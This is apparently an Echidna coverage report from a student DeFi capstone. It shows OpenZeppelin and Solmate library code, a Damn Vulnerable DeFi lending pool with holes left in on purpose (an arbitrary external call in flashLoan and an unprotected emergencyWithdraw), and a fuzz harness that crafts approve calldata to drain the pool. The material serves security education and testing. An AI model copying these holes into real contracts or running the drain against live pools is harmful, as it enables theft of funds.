/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/utils/Address.sol
   1 |     | // SPDX-License-Identifier: MIT
   2 |     | // OpenZeppelin Contracts (last updated v5.4.0) (utils/Address.sol)
   3 |     | 
   4 |     | pragma solidity ^0.8.20;
   5 |     | 
   6 |     | import {Errors} from "./Errors.sol";
   7 |     | 
   8 |     | /**
   9 |     |  * @dev Collection of functions related to the address type
  10 |     |  */
  11 |     | library Address {
  12 |     |     /**
  13 |     |      * @dev There's no code at `target` (it is not a contract).
  14 |     |      */
  15 |     |     error AddressEmptyCode(address target);
  16 |     | 
  17 |     |     /**
  18 |     |      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
  19 |     |      * `recipient`, forwarding all available gas and reverting on errors.
  20 |     |      *
  21 |     |      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
  22 |     |      * of certain opcodes, possibly making contracts go over the 2300 gas limit
  23 |     |      * imposed by `transfer`, making them unable to receive funds via
  24 |     |      * `transfer`. {sendValue} removes this limitation.
  25 |     |      *
  26 |     |      * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].
  27 |     |      *
  28 |     |      * IMPORTANT: because control is transferred to `recipient`, care must be
  29 |     |      * taken to not create reentrancy vulnerabilities. Consider using
  30 |     |      * {ReentrancyGuard} or the
  31 |     |      * https://solidity.readthedocs.io/en/v0.8.20/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
  32 |     |      */
  33 |     |     function sendValue(address payable recipient, uint256 amount) internal {
  34 |     |         if (address(this).balance < amount) {
  35 |     |             revert Errors.InsufficientBalance(address(this).balance, amount);
  36 |     |         }
  37 |     | 
  38 |     |         (bool success, bytes memory returndata) = recipient.call{value: amount}("");
  39 |     |         if (!success) {
  40 |     |             _revert(returndata);
  41 |     |         }
  42 |     |     }
  43 |     | 
  44 |     |     /**
  45 |     |      * @dev Performs a Solidity function call using a low level `call`. A
  46 |     |      * plain `call` is an unsafe replacement for a function call: use this
  47 |     |      * function instead.
  48 |     |      *
  49 |     |      * If `target` reverts with a revert reason or custom error, it is bubbled
  50 |     |      * up by this function (like regular Solidity function calls). However, if
  51 |     |      * the call reverted with no returned reason, this function reverts with a
  52 |     |      * {Errors.FailedCall} error.
  53 |     |      *
  54 |     |      * Returns the raw returned data. To convert to the expected return value,
  55 |     |      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
  56 |     |      *
  57 |     |      * Requirements:
  58 |     |      *
  59 |     |      * - `target` must be a contract.
  60 |     |      * - calling `target` with `data` must not revert.
  61 |     |      */
  62 | *   |     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
  63 | *   |         return functionCallWithValue(target, data, 0);
  64 |     |     }
  65 |     | 
  66 |     |     /**
  67 |     |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
  68 |     |      * but also transferring `value` wei to `target`.
  69 |     |      *
  70 |     |      * Requirements:
  71 |     |      *
  72 |     |      * - the calling contract must have an ETH balance of at least `value`.
  73 |     |      * - the called Solidity function must be `payable`.
  74 |     |      */
  75 | *   |     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
  76 | *   |         if (address(this).balance < value) {
  77 |     |             revert Errors.InsufficientBalance(address(this).balance, value);
  78 |     |         }
  79 | *   |         (bool success, bytes memory returndata) = target.call{value: value}(data);
  80 | *   |         return verifyCallResultFromTarget(target, success, returndata);
  81 |     |     }
  82 |     | 
  83 |     |     /**
  84 |     |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
  85 |     |      * but performing a static call.
  86 |     |      */
  87 |     |     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
  88 |     |         (bool success, bytes memory returndata) = target.staticcall(data);
  89 |     |         return verifyCallResultFromTarget(target, success, returndata);
  90 |     |     }
  91 |     | 
  92 |     |     /**
  93 |     |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
  94 |     |      * but performing a delegate call.
  95 |     |      */
  96 |     |     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
  97 |     |         (bool success, bytes memory returndata) = target.delegatecall(data);
  98 |     |         return verifyCallResultFromTarget(target, success, returndata);
  99 |     |     }
 100 |     | 
 101 |     |     /**
 102 |     |      * @dev Tool to verify that a low level call to smart-contract was successful, and reverts if the target
 103 |     |      * was not a contract or bubbling up the revert reason (falling back to {Errors.FailedCall}) in case
 104 |     |      * of an unsuccessful call.
 105 |     |      */
 106 | *   |     function verifyCallResultFromTarget(
 107 |     |         address target,
 108 |     |         bool success,
 109 |     |         bytes memory returndata
 110 | *   |     ) internal view returns (bytes memory) {
 111 | *   |         if (!success) {
 112 | *   |             _revert(returndata);
 113 |     |         } else {
 114 |     |             // only check if target is a contract if the call was successful and the return data is empty
 115 |     |             // otherwise we already know that it was a contract
 116 | *   |             if (returndata.length == 0 && target.code.length == 0) {
 117 | *   |                 revert AddressEmptyCode(target);
 118 |     |             }
 119 | *   |             return returndata;
 120 |     |         }
 121 |     |     }
 122 |     | 
 123 |     |     /**
 124 |     |      * @dev Tool to verify that a low level call was successful, and reverts if it wasn't, either by bubbling the
 125 |     |      * revert reason or with a default {Errors.FailedCall} error.
 126 |     |      */
 127 |     |     function verifyCallResult(bool success, bytes memory returndata) internal pure returns (bytes memory) {
 128 |     |         if (!success) {
 129 |     |             _revert(returndata);
 130 |     |         } else {
 131 |     |             return returndata;
 132 |     |         }
 133 |     |     }
 134 |     | 
 135 |     |     /**
 136 |     |      * @dev Reverts with returndata if present. Otherwise reverts with {Errors.FailedCall}.
 137 |     |      */
 138 | *   |     function _revert(bytes memory returndata) private pure {
 139 |     |         // Look for revert reason and bubble it up if present
 140 | *   |         if (returndata.length > 0) {
 141 |     |             // The easiest way to bubble the revert reason is using memory via assembly
 142 |     |             assembly ("memory-safe") {
 143 | *   |                 revert(add(returndata, 0x20), mload(returndata))
 144 |     |             }
 145 |     |         } else {
 146 | *   |             revert Errors.FailedCall();
 147 |     |         }
 148 |     |     }
 149 |     | }
 150 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/utils/Errors.sol
  1 |     | // SPDX-License-Identifier: MIT
  2 |     | // OpenZeppelin Contracts (last updated v5.1.0) (utils/Errors.sol)
  3 |     | 
  4 |     | pragma solidity ^0.8.20;
  5 |     | 
  6 |     | /**
  7 |     |  * @dev Collection of common custom errors used in multiple contracts
  8 |     |  *
  9 |     |  * IMPORTANT: Backwards compatibility is not guaranteed in future versions of the library.
 10 |     |  * It is recommended to avoid relying on the error API for critical functionality.
 11 |     |  *
 12 |     |  * _Available since v5.1._
 13 |     |  */
 14 |     | library Errors {
 15 |     |     /**
 16 |     |      * @dev The ETH balance of the account is not enough to perform the operation.
 17 |     |      */
 18 |     |     error InsufficientBalance(uint256 balance, uint256 needed);
 19 |     | 
 20 |     |     /**
 21 |     |      * @dev A call to an address target failed. The target may have reverted.
 22 |     |      */
 23 |     |     error FailedCall();
 24 |     | 
 25 |     |     /**
 26 |     |      * @dev The deployment failed.
 27 |     |      */
 28 |     |     error FailedDeployment();
 29 |     | 
 30 |     |     /**
 31 |     |      * @dev A necessary precompile is missing.
 32 |     |      */
 33 |     |     error MissingPrecompile(address);
 34 |     | }
 35 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol
  1 |     | // SPDX-License-Identifier: MIT
  2 |     | // OpenZeppelin Contracts (last updated v5.1.0) (utils/ReentrancyGuard.sol)
  3 |     | 
  4 |     | pragma solidity ^0.8.20;
  5 |     | 
  6 |     | /**
  7 |     |  * @dev Contract module that helps prevent reentrant calls to a function.
  8 |     |  *
  9 |     |  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 10 |     |  * available, which can be applied to functions to make sure there are no nested
 11 |     |  * (reentrant) calls to them.
 12 |     |  *
 13 |     |  * Note that because there is a single `nonReentrant` guard, functions marked as
 14 |     |  * `nonReentrant` may not call one another. This can be worked around by making
 15 |     |  * those functions `private`, and then adding `external` `nonReentrant` entry
 16 |     |  * points to them.
 17 |     |  *
 18 |     |  * TIP: If EIP-1153 (transient storage) is available on the chain you're deploying at,
 19 |     |  * consider using {ReentrancyGuardTransient} instead.
 20 |     |  *
 21 |     |  * TIP: If you would like to learn more about reentrancy and alternative ways
 22 |     |  * to protect against it, check out our blog post
 23 |     |  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 24 |     |  */
 25 |     | abstract contract ReentrancyGuard {
 26 |     |     // Booleans are more expensive than uint256 or any type that takes up a full
 27 |     |     // word because each write operation emits an extra SLOAD to first read the
 28 |     |     // slot's contents, replace the bits taken up by the boolean, and then write
 29 |     |     // back. This is the compiler's defense against contract upgrades and
 30 |     |     // pointer aliasing, and it cannot be disabled.
 31 |     | 
 32 |     |     // The values being non-zero value makes deployment a bit more expensive,
 33 |     |     // but in exchange the refund on every call to nonReentrant will be lower in
 34 |     |     // amount. Since refunds are capped to a percentage of the total
 35 |     |     // transaction's gas, it is best to keep them low in cases like this one, to
 36 |     |     // increase the likelihood of the full refund coming into effect.
 37 | *   |     uint256 private constant NOT_ENTERED = 1;
 38 | *   |     uint256 private constant ENTERED = 2;
 39 |     | 
 40 |     |     uint256 private _status;
 41 |     | 
 42 |     |     /**
 43 |     |      * @dev Unauthorized reentrant call.
 44 |     |      */
 45 |     |     error ReentrancyGuardReentrantCall();
 46 |     | 
 47 |     |     constructor() {
 48 | *   |         _status = NOT_ENTERED;
 49 |     |     }
 50 |     | 
 51 |     |     /**
 52 |     |      * @dev Prevents a contract from calling itself, directly or indirectly.
 53 |     |      * Calling a `nonReentrant` function from another `nonReentrant`
 54 |     |      * function is not supported. It is possible to prevent this from happening
 55 |     |      * by making the `nonReentrant` function external, and making it call a
 56 |     |      * `private` function that does the actual work.
 57 |     |      */
 58 |     |     modifier nonReentrant() {
 59 | *   |         _nonReentrantBefore();
 60 |     |         _;
 61 | *   |         _nonReentrantAfter();
 62 |     |     }
 63 |     | 
 64 | *   |     function _nonReentrantBefore() private {
 65 |     |         // On the first call to nonReentrant, _status will be NOT_ENTERED
 66 | *   |         if (_status == ENTERED) {
 67 | *   |             revert ReentrancyGuardReentrantCall();
 68 |     |         }
 69 |     | 
 70 |     |         // Any calls to nonReentrant after this point will fail
 71 | *   |         _status = ENTERED;
 72 |     |     }
 73 |     | 
 74 | *   |     function _nonReentrantAfter() private {
 75 |     |         // By storing the original value once again, a refund is triggered (see
 76 |     |         // https://eips.ethereum.org/EIPS/eip-2200)
 77 | *   |         _status = NOT_ENTERED;
 78 |     |     }
 79 |     | 
 80 |     |     /**
 81 |     |      * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
 82 |     |      * `nonReentrant` function in the call stack.
 83 |     |      */
 84 |     |     function _reentrancyGuardEntered() internal view returns (bool) {
 85 |     |         return _status == ENTERED;
 86 |     |     }
 87 |     | }
 88 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/solmate/src/tokens/ERC20.sol
   1 |     | // SPDX-License-Identifier: AGPL-3.0-only
   2 |     | pragma solidity >=0.8.0;
   3 |     | 
   4 |     | /// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.
   5 |     | /// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)
   6 |     | /// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)
   7 |     | /// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.
   8 |     | abstract contract ERC20 {
   9 |     |     /*//////////////////////////////////////////////////////////////
  10 |     |                                  EVENTS
  11 |     |     //////////////////////////////////////////////////////////////*/
  12 |     | 
  13 |     |     event Transfer(address indexed from, address indexed to, uint256 amount);
  14 |     | 
  15 |     |     event Approval(address indexed owner, address indexed spender, uint256 amount);
  16 |     | 
  17 |     |     /*//////////////////////////////////////////////////////////////
  18 |     |                             METADATA STORAGE
  19 |     |     //////////////////////////////////////////////////////////////*/
  20 |     | 
  21 |     |     string public name;
  22 |     | 
  23 |     |     string public symbol;
  24 |     | 
  25 |     |     uint8 public immutable decimals;
  26 |     | 
  27 |     |     /*//////////////////////////////////////////////////////////////
  28 |     |                               ERC20 STORAGE
  29 |     |     //////////////////////////////////////////////////////////////*/
  30 |     | 
  31 |     |     uint256 public totalSupply;
  32 |     | 
  33 | *   |     mapping(address => uint256) public balanceOf;
  34 |     | 
  35 | *   |     mapping(address => mapping(address => uint256)) public allowance;
  36 |     | 
  37 |     |     /*//////////////////////////////////////////////////////////////
  38 |     |                             EIP-2612 STORAGE
  39 |     |     //////////////////////////////////////////////////////////////*/
  40 |     | 
  41 |     |     uint256 internal immutable INITIAL_CHAIN_ID;
  42 |     | 
  43 |     |     bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;
  44 |     | 
  45 |     |     mapping(address => uint256) public nonces;
  46 |     | 
  47 |     |     /*//////////////////////////////////////////////////////////////
  48 |     |                                CONSTRUCTOR
  49 |     |     //////////////////////////////////////////////////////////////*/
  50 |     | 
  51 | *   |     constructor(
  52 |     |         string memory _name,
  53 |     |         string memory _symbol,
  54 |     |         uint8 _decimals
  55 |     |     ) {
  56 | *   |         name = _name;
  57 | *   |         symbol = _symbol;
  58 | *   |         decimals = _decimals;
  59 |     | 
  60 | *   |         INITIAL_CHAIN_ID = block.chainid;
  61 | *   |         INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();
  62 |     |     }
  63 |     | 
  64 |     |     /*//////////////////////////////////////////////////////////////
  65 |     |                                ERC20 LOGIC
  66 |     |     //////////////////////////////////////////////////////////////*/
  67 |     | 
  68 | *   |     function approve(address spender, uint256 amount) public virtual returns (bool) {
  69 | *   |         allowance[msg.sender][spender] = amount;
  70 |     | 
  71 | *   |         emit Approval(msg.sender, spender, amount);
  72 |     | 
  73 | *   |         return true;
  74 |     |     }
  75 |     | 
  76 | *   |     function transfer(address to, uint256 amount) public virtual returns (bool) {
  77 | *   |         balanceOf[msg.sender] -= amount;
  78 |     | 
  79 |     |         // Cannot overflow because the sum of all user
  80 |     |         // balances can't exceed the max uint256 value.
  81 |     |         unchecked {
  82 | *   |             balanceOf[to] += amount;
  83 |     |         }
  84 |     | 
  85 | *   |         emit Transfer(msg.sender, to, amount);
  86 |     | 
  87 | *   |         return true;
  88 |     |     }
  89 |     | 
  90 | *   |     function transferFrom(
  91 |     |         address from,
  92 |     |         address to,
  93 |     |         uint256 amount
  94 | *   |     ) public virtual returns (bool) {
  95 | *   |         uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.
  96 |     | 
  97 | *   |         if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
  98 |     | 
  99 | *   |         balanceOf[from] -= amount;
 100 |     | 
 101 |     |         // Cannot overflow because the sum of all user
 102 |     |         // balances can't exceed the max uint256 value.
 103 |     |         unchecked {
 104 | *   |             balanceOf[to] += amount;
 105 |     |         }
 106 |     | 
 107 | *   |         emit Transfer(from, to, amount);
 108 |     | 
 109 | *   |         return true;
 110 |     |     }
 111 |     | 
 112 |     |     /*//////////////////////////////////////////////////////////////
 113 |     |                              EIP-2612 LOGIC
 114 |     |     //////////////////////////////////////////////////////////////*/
 115 |     | 
 116 | *   |     function permit(
 117 |     |         address owner,
 118 |     |         address spender,
 119 |     |         uint256 value,
 120 |     |         uint256 deadline,
 121 |     |         uint8 v,
 122 |     |         bytes32 r,
 123 |     |         bytes32 s
 124 |     |     ) public virtual {
 125 | *   |         require(deadline >= block.timestamp, "PERMIT_DEADLINE_EXPIRED");
 126 |     | 
 127 |     |         // Unchecked because the only math done is incrementing
 128 |     |         // the owner's nonce which cannot realistically overflow.
 129 |     |         unchecked {
 130 | *   |             address recoveredAddress = ecrecover(
 131 | *   |                 keccak256(
 132 | *   |                     abi.encodePacked(
 133 |     |                         "\x19\x01",
 134 | *   |                         DOMAIN_SEPARATOR(),
 135 | *   |                         keccak256(
 136 | *   |                             abi.encode(
 137 | *   |                                 keccak256(
 138 |     |                                     "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
 139 |     |                                 ),
 140 | *   |                                 owner,
 141 | *   |                                 spender,
 142 | *   |                                 value,
 143 | *   |                                 nonces[owner]++,
 144 | *   |                                 deadline
 145 |     |                             )
 146 |     |                         )
 147 |     |                     )
 148 |     |                 ),
 149 | *   |                 v,
 150 | *   |                 r,
 151 | *   |                 s
 152 |     |             );
 153 |     | 
 154 | *   |             require(recoveredAddress != address(0) && recoveredAddress == owner, "INVALID_SIGNER");
 155 |     | 
 156 |     |             allowance[recoveredAddress][spender] = value;
 157 |     |         }
 158 |     | 
 159 |     |         emit Approval(owner, spender, value);
 160 |     |     }
 161 |     | 
 162 | *   |     function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {
 163 | *   |         return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();
 164 |     |     }
 165 |     | 
 166 | *   |     function computeDomainSeparator() internal view virtual returns (bytes32) {
 167 | *   |         return
 168 | *   |             keccak256(
 169 | *   |                 abi.encode(
 170 | *   |                     keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
 171 | *   |                     keccak256(bytes(name)),
 172 | *   |                     keccak256("1"),
 173 | *   |                     block.chainid,
 174 | *   |                     address(this)
 175 |     |                 )
 176 |     |             );
 177 |     |     }
 178 |     | 
 179 |     |     /*//////////////////////////////////////////////////////////////
 180 |     |                         INTERNAL MINT/BURN LOGIC
 181 |     |     //////////////////////////////////////////////////////////////*/
 182 |     | 
 183 | *   |     function _mint(address to, uint256 amount) internal virtual {
 184 | *   |         totalSupply += amount;
 185 |     | 
 186 |     |         // Cannot overflow because the sum of all user
 187 |     |         // balances can't exceed the max uint256 value.
 188 |     |         unchecked {
 189 | *   |             balanceOf[to] += amount;
 190 |     |         }
 191 |     | 
 192 | *   |         emit Transfer(address(0), to, amount);
 193 |     |     }
 194 |     | 
 195 |     |     function _burn(address from, uint256 amount) internal virtual {
 196 |     |         balanceOf[from] -= amount;
 197 |     | 
 198 |     |         // Cannot underflow because a user's balance
 199 |     |         // will never be larger than the total supply.
 200 |     |         unchecked {
 201 |     |             totalSupply -= amount;
 202 |     |         }
 203 |     | 
 204 |     |         emit Transfer(from, address(0), amount);
 205 |     |     }
 206 |     | }
 207 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/src/Token.sol
  1 |     | // SPDX-License-Identifier: UNLICENSED
  2 |     | pragma solidity ^0.8.19;
  3 |     | 
  4 |     | import "../lib/solmate/src/tokens/ERC20.sol";
  5 |     | 
  6 | *   | contract MyToken is ERC20 {
  7 | *   |     constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol, 18) {}
  8 |     | 
  9 |     |     // simple mint for tests/fuzzing (anyone can mint in this test token)
 10 | *   |     function mint(address to, uint256 amount) external {
 11 | *   |         _mint(to, amount);
 12 |     |     }
 13 |     | 
 14 |     |     // expose a convenience function wrapping transferFrom for easier calls in fuzz harness
 15 | *   |     function safeTransferFrom(address from, address to, uint256 amount) external returns (bool) {
 16 | *   |         return transferFrom(from, to, amount);
 17 |     |     }
 18 |     | }
 19 |     | 
 20 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/src/truster/TrusterLenderPool.sol
  1 |     | // SPDX-License-Identifier: MIT
  2 |     | // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
  3 |     | pragma solidity ^0.8.20;
  4 |     | 
  5 |     | import {Address} from "@openzeppelin/contracts/utils/Address.sol";
  6 |     | import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
  7 |     | import {MyToken} from "../Token.sol";
  8 |     | 
  9 |     | /**
 10 |     |  * @title TrusterLenderPoolChallenge
 11 |     |  * @dev A challenge contract designed specifically for Echidna fuzzing
 12 |     |  * 
 13 |     |  * This contract contains multiple vulnerabilities that can be discovered
 14 |     |  * through systematic fuzzing with Echidna.
 15 |     |  */
 16 | *   | contract TrusterLenderPool is ReentrancyGuard {
 17 |     |     using Address for address;
 18 |     | 
 19 |     |     MyToken public immutable token;
 20 |     |     
 21 |     |     // Challenge state tracking
 22 |     |     uint256 public totalFlashLoans;
 23 |     |     uint256 public totalRepayments;
 24 |     |     mapping(address => uint256) public borrowerDebts;
 25 |     |     
 26 |     |     // Events for tracking
 27 |     |     event FlashLoanIssued(address indexed borrower, uint256 amount);
 28 |     |     event FlashLoanRepaid(address indexed borrower, uint256 amount);
 29 |     |     event UnauthorizedCall(address indexed target, bytes data);
 30 |     | 
 31 |     |     error RepayFailed();
 32 |     | 
 33 | *   |     constructor(MyToken _token) {
 34 | *   |         token = _token;
 35 |     |     }
 36 |     | 
 37 |     |     /**
 38 |     |      * @dev Main vulnerability: Arbitrary external call without proper validation
 39 |     |      * This allows attackers to manipulate the token contract or other contracts
 40 |     |      */
 41 | *   |     function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
 42 |     |         external
 43 |     |         nonReentrant
 44 | *   |         returns (bool)
 45 |     |     {
 46 | *   |         uint256 balanceBefore = token.balanceOf(address(this));
 47 |     |         
 48 |     |         // Transfer tokens to borrower
 49 | *   |         if (amount > 0) {
 50 | *   |             token.transfer(borrower, amount);
 51 | *   |             totalFlashLoans++;
 52 | *   |             borrowerDebts[borrower] += amount;
 53 | *   |             emit FlashLoanIssued(borrower, amount);
 54 |     |         }
 55 |     |         
 56 |     |         // VULNERABILITY: Arbitrary external call
 57 |     |         // This allows attackers to call any function on any contract
 58 | *   |         if (target != address(0) && data.length > 0) {
 59 | *   |             target.functionCall(data);
 60 | *   |             emit UnauthorizedCall(target, data);
 61 |     |         }
 62 |     | 
 63 |     |         // Check repayment
 64 | *   |         if (token.balanceOf(address(this)) < balanceBefore) {
 65 | *   |             revert RepayFailed();
 66 |     |         }
 67 |     | 
 68 | *   |         totalRepayments++;
 69 | *   |         emit FlashLoanRepaid(borrower, amount);
 70 | *   |         return true;
 71 |     |     }
 72 |     | 
 73 |     |     /**
 74 |     |      * @dev Additional vulnerability: Missing access control
 75 |     |      * Anyone can call this function to manipulate pool state
 76 |     |      */
 77 | *   |     function emergencyWithdraw(address to, uint256 amount) external {
 78 |     |         // VULNERABILITY: No access control
 79 | *   |         token.transfer(to, amount);
 80 |     |     }
 81 |     | 
 82 |     |     /**
 83 |     |      * @dev Helper function for Echidna to check pool state
 84 |     |      */
 85 | *   |     function getPoolState() external view returns (
 86 | *   |         uint256 balance,
 87 | *   |         uint256 loans,
 88 | *   |         uint256 repayments
 89 |     |     ) {
 90 | *   |         return (
 91 | *   |             token.balanceOf(address(this)),
 92 | *   |             totalFlashLoans,
 93 | *   |             totalRepayments
 94 |     |         );
 95 |     |     }
 96 |     | }
 97 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/test/truster/TrusterEchidnaChallenge.sol
   1 |     | // SPDX-License-Identifier: MIT
   2 |     | pragma solidity ^0.8.20;
   3 |     | 
   4 |     | import {MyToken} from "../../src/Token.sol";
   5 |     | import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
   6 |     | 
   7 |     | /**
   8 |     |  * @title TrusterEchidnaChallenge
   9 |     |  * @dev Comprehensive Echidna test for discovering Truster vulnerabilities
  10 |     |  */
  11 | *r  | contract TrusterEchidnaChallenge {
  12 | *   |     MyToken public token;
  13 | *   |     TrusterLenderPool public pool;
  14 |     |     
  15 |     |     // Challenge constants
  16 | *   |     uint256 public constant INITIAL_POOL_BALANCE = 1_000_000e18;
  17 | *   |     uint256 public constant MAX_EXPLOIT_AMOUNT = 100_000e18;
  18 |     |     
  19 |     |     // State tracking
  20 | *   |     address public immutable attacker;
  21 | *   |     uint256 public exploitAttempts;
  22 | *   |     uint256 public successfulExploits;
  23 |     |     
  24 | *   |     constructor() {
  25 |     |         // Deploy contracts
  26 | *   |         token = new MyToken("ChallengeToken", "CHL");
  27 | *   |         pool = new TrusterLenderPool(token);
  28 |     |         
  29 |     |         // Set up attacker
  30 | *   |         attacker = address(this);
  31 |     |         
  32 |     |         // Fund the pool
  33 | *   |         token.mint(address(this), INITIAL_POOL_BALANCE);
  34 | *   |         token.transfer(address(pool), INITIAL_POOL_BALANCE);
  35 |     |         
  36 |     |         // Give attacker some tokens
  37 | *   |         token.mint(attacker, 1000e18);
  38 |     |     }
  39 |     | 
  40 |     |     // ============ INVARIANTS ============
  41 |     |     
  42 |     |     /**
  43 |     |      * @dev Invariant 1: Pool balance should never decrease without proper accounting
  44 |     |      */
  45 |     |     function echidna_pool_balance_invariant() public view returns (bool) {
  46 |     |         uint256 currentBalance = token.balanceOf(address(pool));
  47 |     |         return currentBalance >= INITIAL_POOL_BALANCE - 1e18; // Only allow negligible loss
  48 |     |     }
  49 |     |     
  50 |     |     /**
  51 |     |      * @dev Invariant 2: Pool should never approve unknown addresses
  52 |     |      */
  53 |     |     function echidna_no_unauthorized_approvals() public view returns (bool) {
  54 |     |         uint256 allowance = token.allowance(address(pool), attacker);
  55 |     |         return allowance == 0;
  56 |     |     }
  57 |     |     
  58 |     |     /**
  59 |     |      * @dev Invariant 3: Attacker should not accumulate excessive tokens
  60 |     |      */
  61 |     |     function echidna_attacker_balance_limited() public view returns (bool) {
  62 |     |         uint256 attackerBalance = token.balanceOf(attacker);
  63 |     |         return attackerBalance <= 1000e18; // Attacker should only have initial tokens
  64 |     |     }
  65 |     |     
  66 |     |     /**
  67 |     |      * @dev Invariant 4: Flash loan accounting should be consistent
  68 |     |      */
  69 |     |     function echidna_flash_loan_accounting() public view returns (bool) {
  70 |     |         (, uint256 loans, uint256 repayments) = pool.getPoolState();
  71 |     |         // Basic sanity check
  72 |     |         return loans >= repayments;
  73 |     |     }
  74 |     | 
  75 |     |     // ============ FUZZING FUNCTIONS ============
  76 |     |     
  77 |     |     /**
  78 |     |      * @dev Function 1: Attempt approval exploit
  79 |     |      */
  80 | *   |     function attemptApprovalExploit(uint256 amount) public {
  81 | *   |         exploitAttempts++;
  82 |     |         
  83 |     |         // Constrain amount to reasonable values
  84 | *   |         if (amount == 0 || amount > token.balanceOf(address(pool))) {
  85 | *   |             return;
  86 |     |         }
  87 |     |         
  88 |     |         // Craft malicious calldata to approve attacker
  89 | *   |         bytes memory maliciousData = abi.encodeWithSignature(
  90 |     |             "approve(address,uint256)",
  91 | *   |             attacker,
  92 | *   |             amount
  93 |     |         );
  94 |     |         
  95 | *   |         try pool.flashLoan(0, attacker, address(token), maliciousData) {
  96 |     |             // Check if approval was successful
  97 | *   |             uint256 allowance = token.allowance(address(pool), attacker);
  98 | *   |             if (allowance >= amount && allowance > 0) {
  99 | *   |                 successfulExploits++;
 100 |     |                 // Execute the exploit - transfer the approved tokens
 101 | *   |                 token.transferFrom(address(pool), attacker, allowance);
 102 |     |             }
 103 |     |         } catch {
 104 |     |             // Exploit failed
 105 |     |         }
 106 |     |     }
 107 |     |     
 108 |     |     /**
 109 |     |      * @dev Function 2: Attempt emergency withdraw exploit
 110 |     |      */
 111 | *   |     function attemptEmergencyWithdrawExploit(uint256 amount) public {
 112 | *   |         exploitAttempts++;
 113 |     |         
 114 | *   |         try pool.emergencyWithdraw(attacker, amount) {
 115 | *   |             successfulExploits++;
 116 |     |         } catch {
 117 |     |             // Exploit failed
 118 |     |         }
 119 |     |     }
 120 |     |     
 121 |     |     /**
 122 |     |      * @dev Function 3: Attempt generic external call
 123 |     |      */
 124 | *   |     function attemptGenericCall(address target, bytes calldata data) public {
 125 | *   |         exploitAttempts++;
 126 |     |         
 127 | *   |         try pool.flashLoan(0, attacker, target, data) {
 128 |     |             // Check for any state changes
 129 | *   |             if (token.allowance(address(pool), attacker) > 0) {
 130 | *   |                 successfulExploits++;
 131 |     |             }
 132 |     |         } catch {
 133 |     |             // Call failed
 134 |     |         }
 135 |     |     }
 136 |     |     
 137 |     |     /**
 138 |     |      * @dev Function 4: Attempt flash loan with various parameters
 139 |     |      */
 140 | *   |     function attemptFlashLoan(
 141 |     |         uint256 amount,
 142 |     |         address borrower,
 143 |     |         address target,
 144 |     |         bytes calldata data
 145 |     |     ) public {
 146 | *   |         exploitAttempts++;
 147 |     |         
 148 |     |         // Constrain inputs
 149 | *   |         if (amount > token.balanceOf(address(pool))) {
 150 | *   |             return;
 151 |     |         }
 152 |     |         
 153 | *   |         try pool.flashLoan(amount, borrower, target, data) {
 154 |     |             // Check for successful exploit
 155 | *   |             if (token.balanceOf(attacker) > 1000e18) {
 156 | *   |                 successfulExploits++;
 157 |     |             }
 158 |     |         } catch {
 159 |     |             // Flash loan failed
 160 |     |         }
 161 |     |     }
 162 |     |     
 163 |     |     /**
 164 |     |      * @dev Function 5: Attempt token manipulation
 165 |     |      */
 166 | *   |     function attemptTokenManipulation(bytes calldata data) public {
 167 | *   |         exploitAttempts++;
 168 |     |         
 169 | *   |         try pool.flashLoan(0, attacker, address(token), data) {
 170 |     |             // Check for any token state changes
 171 | *   |             if (token.allowance(address(pool), attacker) > 0) {
 172 | *   |                 successfulExploits++;
 173 |     |             }
 174 |     |         } catch {
 175 |     |             // Manipulation failed
 176 |     |         }
 177 |     |     }
 178 |     | 
 179 |     |     // ============ HELPER FUNCTIONS ============
 180 |     |     
 181 |     |     /**
 182 |     |      * @dev Get detailed state for analysis
 183 |     |      */
 184 | *   |     function getDetailedState() public view returns (
 185 | *   |         uint256 poolBalance,
